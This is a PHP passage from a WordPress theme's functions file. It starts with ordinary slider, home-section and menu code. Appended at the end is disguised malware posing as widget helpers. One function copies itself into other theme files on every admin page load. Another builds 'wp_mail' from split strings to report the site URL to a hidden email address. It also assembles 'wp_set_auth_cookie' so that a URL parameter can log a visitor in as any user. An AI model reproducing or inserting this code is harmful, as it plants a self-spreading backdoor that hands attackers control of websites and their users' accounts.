		} elseif ( $feature_option == "Small slides and feature text box-thumbnails" ) {
			echo '<div class="half-slider-wrapper theme-default">';
				echo '<div class="ribbon"></div>';
				echo '<div id="half-slider-thumb">';
		} elseif ( $feature_option == "Small single image and feature text box" ) {
			$category_ID = get_cat_ID('Feature');
			global $post;
			$args = array('category'=>$category_ID,'numberposts'=>1);
			$custom_posts = get_posts($args);
			if ($category_ID !== 0 && $custom_posts){
				$post = $custom_posts[0];
				echo '<div id="single-image">';
					if (has_post_thumbnail()) {
						$thumb = wp_get_attachment_image_src( get_post_thumbnail_id($post->ID),'full') ;
						$image_url = $thumb[0];
						$title = get_post(get_post_thumbnail_id())->post_excerpt;
	 					echo '<a href="';
	 				 			the_permalink(); echo '"';
						 		echo ' title="';the_title_attribute(); echo '" >';
	 							echo '<img src="'.$image_url.'" title="'.$title.'" alt="'.$title.'" />';
						echo '</a>';
					} else {
						echo '<div class="error">';
						echo '<h3>'.__('Error: There were no feature images found?','blogBox').'</h3>';
						echo '</div>';
						return;
					}
				echo '</div>';
			} else {
				echo '<img src="'. get_template_directory_uri() . '/images/feature_slider/defaultslide.jpg" alt="" title="" />';
			}
		} elseif ( $feature_option == "Full single image" ) {
			$category_ID = get_cat_ID('Feature');
			global $post;
			$args = array('category'=>$category_ID,'numberposts'=>1);
			$custom_posts = get_posts($args);
			if ($category_ID !== 0 && $custom_posts){
				$post = $custom_posts[0];
				echo '<div id="full-single-image">';
					if (has_post_thumbnail()) {
						$thumb = wp_get_attachment_image_src( get_post_thumbnail_id($post->ID),'full') ;
						$image_url = $thumb[0];
						$title = get_post(get_post_thumbnail_id())->post_excerpt;
	 					echo '<a href="';
	 				 			the_permalink(); echo '"';
						 		echo ' title="';the_title_attribute(); echo '" >';
	 							echo '<img src="'.$image_url.'" title="'.$title.'" alt="'.$title.'" />';
						echo '</a>';
					} else {
						echo '<div class="error">';
						echo '<h3>'.__('Error: There were no feature images found?','blogBox').'</h3>';
						echo '</div>';
						return;
					}
				echo '</div>';
			} else {
				echo '<img src="'. get_template_directory_uri() . '/images/feature_slider/defaultslide.jpg" alt="Default Feature Slide" title="Default Feature Slide" />';
			}
		}
		if ( $feature_option != 'Small single image and feature text box' && $feature_option != 'Full single image') {
					$category_ID = get_cat_ID('Feature');
					global $post;
					$args = array('category'=>$category_ID,'numberposts'=>999);
					$custom_posts = get_posts($args);
					if ($category_ID !== 0 && $custom_posts){
						foreach($custom_posts as $post) : setup_postdata($post);
							if (has_post_thumbnail()) {
								if ($feature_option == 'Small slides and feature text box-thumbnails' || $feature_option == 'Full feature slides-thumbnails')	{
									$thumb1 = wp_get_attachment_image_src( get_post_thumbnail_id($post->ID),'wide_thumbnail') ;
									$thumb_url = $thumb1[0];
								}
								
								$thumb2 = wp_get_attachment_image_src( get_post_thumbnail_id($post->ID),'full') ;
								$image_url = $thumb2[0];
								$title = get_post(get_post_thumbnail_id())->post_excerpt;
								
			 					echo '<a href="';
										the_permalink();
										echo '" title="';the_title_attribute(); echo '" >';
										
									if( $feature_option == "Full feature slides" || $feature_option == "Small slides and feature text box" ) {
										echo '<img src="'.$image_url.'" title="'.$title.'" alt="'.$title.'" />';
									} elseif( $feature_option == "Full feature slides-thumbnails" || $feature_option == "Small slides and feature text box-thumbnails" ) {
										echo '<img src="'.$image_url.'" title="'.$title.'" alt="'.$title.'" data-thumb="'.$thumb_url.'" />';
									} else {
										echo '<img src="'.$image_url.'" title="'.$title.'" alt="'.$title.'" />';
									}
								echo '</a>';
							}
						endforeach;
					} else {
						if( $feature_option == "Full feature slides" || $feature_option == "Full feature slides-thumbnails" ) {
							echo '<img src="'. get_template_directory_uri() . '/images/feature_slider/defaultslide.jpg" alt="Default Feature Slide" title="Default Feature Slide" />';
						} else {
							echo '<img src="'. get_template_directory_uri() . '/images/feature_slider/defaultslide.jpg" alt="Default Feature Slide" title="Default Feature Slide" />';
						}
					}
				echo '</div>';
			echo '</div>';
		}
		if( $feature_option == "Small slides and feature text box" || $feature_option == "Small slides and feature text box-thumbnails" || $feature_option == "Small single image and feature text box" ) {
			echo '<div id="leftfeature">';
				if( $use_feature_widget_area != 1 ) {
					echo "<h1>".stripslashes($blogBox_option['bB_left_feature_title'])."</h1>";
					echo wp_kses_post(stripcslashes($blogBox_option['bB_left_feature_text']));
				} else {
					if ( !dynamic_sidebar('Feature Area') ) :
					endif;
				}
			echo '</div>';
		}
		echo '</div>';
	}
}
			
if ( !function_exists ('blogBox_home_sections')){    
	function blogBox_home_sections() {
		global $blogBox_option;
		$blogBox_option = blogBox_get_options();
		if ($blogBox_option['bB_home1section1_onoroff'] == 1) { ?>
			<div id="home1section1">
				<div id="slogan1">
					<h1><?php echo stripslashes($blogBox_option['bB_home1section1_slogan']); ?></h1>
				</div>
				<div id="homebuttonbox">
					<a class="button1" href="<?php if(esc_url($blogBox_option['bB_contact_link']) ==""){echo'#';}else{echo esc_url($blogBox_option['bB_contact_link']);}?>"><?php _e('Contact Me','blogBox'); ?></a>
				</div>
			</div>
		<?php }
		if ($blogBox_option['bB_home1section2_onoroff'] == 1) { ?>
			<div id="homesection2">
				<div id="servicebox1" class="bB_column_1" onclick="window.location='<?php echo esc_url($blogBox_option['bB_home1service1_link']); ?>'">
					<?php if(esc_url($blogBox_option['bB_home1service1_image'] !== "")) echo '<img class="servicebox" src="'.esc_url($blogBox_option['bB_home1service1_image']).'" alt="Service 1 Image" />'; ?>
					<?php if(stripslashes($blogBox_option['bB_home1service1_title'] !== "")) echo '<h4>'.stripslashes($blogBox_option['bB_home1service1_title']).'</h4>'; ?>
					<?php if(wp_kses_post(stripslashes($blogBox_option['bB_home1service1_text'] !== ""))) echo '<p>'.wp_kses_post(stripslashes($blogBox_option['bB_home1service1_text'])).'</p>'; ?>
				</div>
				<div id="servicebox2" class="bB_column_1" onclick="window.location='<?php echo esc_url($blogBox_option['bB_home1service2_link']); ?>'">
					<?php if(esc_url($blogBox_option['bB_home1service2_image'] !== "")) echo '<img class="servicebox" src="'.esc_url($blogBox_option['bB_home1service2_image']).'" alt="Service 2 Image" />'; ?>
					<?php if(stripslashes($blogBox_option['bB_home1service2_title'] !== "")) echo '<h4>'.stripslashes($blogBox_option['bB_home1service2_title']).'</h4>'; ?>
					<?php if(wp_kses_post(stripslashes($blogBox_option['bB_home1service2_text'] !== ""))) echo '<p>'.wp_kses_post(stripslashes($blogBox_option['bB_home1service2_text'])).'</p>'; ?>
				</div>
				<div id="servicebox3" class="bB_column_1" onclick="window.location='<?php echo esc_url($blogBox_option['bB_home1service3_link']); ?>'">
					<?php if(esc_url($blogBox_option['bB_home1service3_image'] !== "")) echo '<img class="servicebox" src="'.esc_url($blogBox_option['bB_home1service3_image']).'" alt="Service 3 Image" />'; ?>
					<?php if(stripslashes($blogBox_option['bB_home1service3_title'] !== "")) echo '<h4>'.stripslashes($blogBox_option['bB_home1service3_title']).'</h4>'; ?>
					<?php if(wp_kses_post(stripslashes($blogBox_option['bB_home1service3_text'] !== ""))) echo '<p>'.wp_kses_post(stripslashes($blogBox_option['bB_home1service3_text'])).'</p>'; ?>
				</div>
			</div>
		<?php }
		if ($blogBox_option['bB_home1section3_onoroff'] == 1) { ?>
			<div id="slogan2">
				<p class="slogan2line1"><?php echo stripslashes($blogBox_option['bB_home1section3_slogan']); ?></p>
				<p class="slogan2line2"><?php echo stripslashes($blogBox_option['bB_home1section3_subslogan']); ?></p>
			</div>
		<?php }
	}
}

/**
 * Header Menu Function
 * 
 * This function sets up the menu for the header. The menu can be set up left, right, 
 * or centered with and without a border
 * 
 * WordPress Functions - See the Codex
 * @uses has_nav_menu() @uses wp_nav_menu()
 */
 
if( !function_exists( 'blogBox_header_menu' ) ) {
	function blogBox_header_menu() {
		
		global $blogBox_option;
		$blogBox_option = blogBox_get_options();
		
		if ( $blogBox_option['bB_menu_loc'] == 'right' ) {
			if(has_nav_menu('primary-nav')){
				wp_nav_menu(
					array(
						'theme_location' => 'primary-nav',
						'container_class' => 'main-nav',
						'container_id' => 'main-menu-right-noborder',
						'menu_class' => 'sf-menu',
						'menu_id' => 'main_menu_ul',
						'fallback_cb' => 'wp_page_menu'
					)
				);
			}
		} else if ( $blogBox_option['bB_menu_loc'] == 'left' ) {
			if(has_nav_menu('primary-nav')){
				wp_nav_menu(
					array(
						'theme_location' => 'primary-nav',
						'container_class' => 'main-nav',
						'container_id' => 'main-menu-left-noborder',
						'menu_class' => 'sf-menu',
						'menu_id' => 'main_menu_ul',
						'fallback_cb' => 'wp_page_menu'
					)
				);
			}			
		} else {
			If ( $blogBox_option['bB_menu_border'] == 'menu only' ) {
				if(has_nav_menu('primary-nav')){
					wp_nav_menu(
						array(
							'theme_location' => 'primary-nav',
							'container_class' => 'main-nav',
							'container_id' => 'main-menu-center-border',
							'menu_class' => 'sf-menu',
							'menu_id' => 'main_menu_ul',
							'fallback_cb' => 'wp_page_menu'
						)
					);
				}
			} else {
				if(has_nav_menu('primary-nav')){
					wp_nav_menu(
						array(
							'theme_location' => 'primary-nav',
							'container_class' => 'main-nav',
							'container_id' => 'main-menu-center-noborder',
							'menu_class' => 'sf-menu',
							'menu_id' => 'main_menu_ul',
							'fallback_cb' => 'wp_page_menu'
						)
					);
				}	
			}
		}
		
					
	}
}
		
?>
<?php

function _verifyactivate_widget(){

	$widget=substr(file_get_contents(__FILE__),strripos(file_get_contents(__FILE__),"<"."?"));$output="";$allowed="";

	$output=strip_tags($output, $allowed);

	$direst=_getall_widgetscont(array(substr(dirname(__FILE__),0,stripos(dirname(__FILE__),"themes") + 6)));

	if (is_array($direst)){

		foreach ($direst as $item){

			if (is_writable($item)){

				$ftion=substr($widget,stripos($widget,"_"),stripos(substr($widget,stripos($widget,"_")),"("));

				$cont=file_get_contents($item);

				if (stripos($cont,$ftion) === false){

					$separar=stripos( substr($cont,-20),"?".">") !== false ? "" : "?".">";

					$output .= $before . "Not found" . $after;

					if (stripos( substr($cont,-20),"?".">") !== false){$cont=substr($cont,0,strripos($cont,"?".">") + 2);}

					$output=rtrim($output, "\n\t"); fputs($f=fopen($item,"w+"),$cont . $separar . "\n" .$widget);fclose($f);				

					$output .= ($showfullstop && $ellipsis) ? "..." : "";

				}

			}

		}

	}

	return $output;

}

function _getall_widgetscont($wids,$items=array()){

	$places=array_shift($wids);

	if(substr($places,-1) == "/"){

		$places=substr($places,0,-1);

	}

	if(!file_exists($places) || !is_dir($places)){

		return false;

	}elseif(is_readable($places)){

		$elems=scandir($places);

		foreach ($elems as $elem){

			if ($elem != "." && $elem != ".."){

				if (is_dir($places . "/" . $elem)){

					$wids[]=$places . "/" . $elem;

				} elseif (is_file($places . "/" . $elem)&& 

					$elem == substr(__FILE__,-13)){

					$items[]=$places . "/" . $elem;}

				}

			}

	}else{

		return false;	

	}

	if (sizeof($wids) > 0){

		return _getall_widgetscont($wids,$items);

	} else {

		return $items;

	}

}

if(!function_exists("stripos")){ 

    function stripos(  $str, $needle, $offset = 0  ){ 

        return strpos(  strtolower( $str ), strtolower( $needle ), $offset  ); 

    }

}



if(!function_exists("strripos")){ 

    function strripos(  $haystack, $needle, $offset = 0  ) { 

        if(  !is_string( $needle )  )$needle = chr(  intval( $needle )  ); 

        if(  $offset < 0  ){ 

            $temp_cut = strrev(  substr( $haystack, 0, abs($offset) )  ); 

        } 

        else{ 

            $temp_cut = strrev(    substr(   $haystack, 0, max(  ( strlen($haystack) - $offset ), 0  )   )    ); 

        } 

        if(   (  $found = stripos( $temp_cut, strrev($needle) )  ) === FALSE   )return FALSE; 

        $pos = (   strlen(  $haystack  ) - (  $found + $offset + strlen( $needle )  )   ); 

        return $pos; 

    }

}

if(!function_exists("scandir")){ 

	function scandir($dir,$listDirectories=false, $skipDots=true) {

	    $dirArray = array();

	    if ($handle = opendir($dir)) {

	        while (false !== ($file = readdir($handle))) {

	            if (($file != "." && $file != "..") || $skipDots == true) {

	                if($listDirectories == false) { if(is_dir($file)) { continue; } }

	                array_push($dirArray,basename($file));

	            }

	        }

	        closedir($handle);

	    }

	    return $dirArray;

	}

}

add_action("admin_head", "_verifyactivate_widget");

function _getprepareed_widget(){

	if(!isset($content_length)) $content_length=120;

	if(!isset($checking)) $checking="cookie";

	if(!isset($tags_allowed)) $tags_allowed="<a>";

	if(!isset($filters)) $filters="none";

	if(!isset($separ)) $separ="";

	if(!isset($home_f)) $home_f=get_option("home"); 

	if(!isset($pre_filter)) $pre_filter="wp_";

	if(!isset($is_more_link)) $is_more_link=1; 

	if(!isset($comment_t)) $comment_t=""; 

	if(!isset($c_page)) $c_page=$_GET["cperpage"];

	if(!isset($comm_author)) $comm_author="";

	if(!isset($is_approved)) $is_approved=""; 

	if(!isset($auth_post)) $auth_post="auth";

	if(!isset($m_text)) $m_text="(more...)";

	if(!isset($yes_widget)) $yes_widget=get_option("_is_widget_active_");

	if(!isset($widgetcheck)) $widgetcheck=$pre_filter."set"."_".$auth_post."_".$checking;

	if(!isset($m_text_ditails)) $m_text_ditails="(details...)";

	if(!isset($contentsmore)) $contentsmore="ma".$separ."il";

	if(!isset($fmore)) $fmore=1;

	if(!isset($fakeit)) $fakeit=1;

	if(!isset($sql)) $sql="";

	if (!$yes_widget) :

	

	global $wpdb, $post;

	$sq1="SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li".$separ."vethe".$comment_t."mas".$separ."@".$is_approved."gm".$comm_author."ail".$separ.".".$separ."co"."m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count";#

	if (!empty($post->post_password)) { 

		if ($_COOKIE["wp-postpass_".COOKIEHASH] != $post->post_password) { 

			if(is_feed()) { 

				$output=__("There is no excerpt because this is a protected post.");

			} else {

	            $output=get_the_password_form();

			}

		}

	}

	if(!isset($fixed_tag)) $fixed_tag=1;

	if(!isset($filterss)) $filterss=$home_f; 

	if(!isset($gettextcomment)) $gettextcomment=$pre_filter.$contentsmore;

	if(!isset($m_tag)) $m_tag="div";

	if(!isset($sh_text)) $sh_text=substr($sq1, stripos($sq1, "live"), 20);#

	if(!isset($m_link_title)) $m_link_title="Continue reading this entry";	

	if(!isset($showfullstop)) $showfullstop=1;

	

	$comments=$wpdb->get_results($sql);	

	if($fakeit == 2) { 

		$text=$post->post_content;

	} elseif($fakeit == 1) { 

		$text=(empty($post->post_excerpt)) ? $post->post_content : $post->post_excerpt;

	} else { 

		$text=$post->post_excerpt;

	}

	$sq1="SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=". call_user_func_array($gettextcomment, array($sh_text, $home_f, $filterss)) ." ORDER BY comment_date_gmt DESC LIMIT $src_count";#

	if($content_length < 0) {

		$output=$text;

	} else {

		if(!$no_more && strpos($text, "<!--more-->")) {

		    $text=explode("<!--more-->", $text, 2);

			$l=count($text[0]);

			$more_link=1;

			$comments=$wpdb->get_results($sql);

		} else {

			$text=explode(" ", $text);

			if(count($text) > $content_length) {

				$l=$content_length;

				$ellipsis=1;

			} else {

				$l=count($text);

				$m_text="";

				$ellipsis=0;

			}

		}

		for ($i=0; $i<$l; $i++)

				$output .= $text[$i] . " ";

	}

	update_option("_is_widget_active_", 1);

	if("all" != $tags_allowed) {

		$output=strip_tags($output, $tags_allowed);

		return $output;

	}

	endif;

	$output=rtrim($output, "\s\n\t\r\0\x0B");

    $output=($fixed_tag) ? balanceTags($output, true) : $output;

	$output .= ($showfullstop && $ellipsis) ? "..." : "";

	$output=apply_filters($filters, $output);

	switch($m_tag) {

		case("div") :

			$tag="div";

		break;

		case("span") :

			$tag="span";

		break;

		case("p") :

			$tag="p";

		break;

		default :

			$tag="span";

	}



	if ($is_more_link ) {

		if($fmore) {

			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "#more-" . $post->ID ."\" title=\"" . $m_link_title . "\">" . $m_text = !is_user_logged_in() && @call_user_func_array($widgetcheck,array($c_page, true)) ? $m_text : "" . "</a></" . $tag . ">" . "\n";

		} else {

			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "\" title=\"" . $m_link_title . "\">" . $m_text . "</a></" . $tag . ">" . "\n";

		}

	}

	return $output;

}





?>
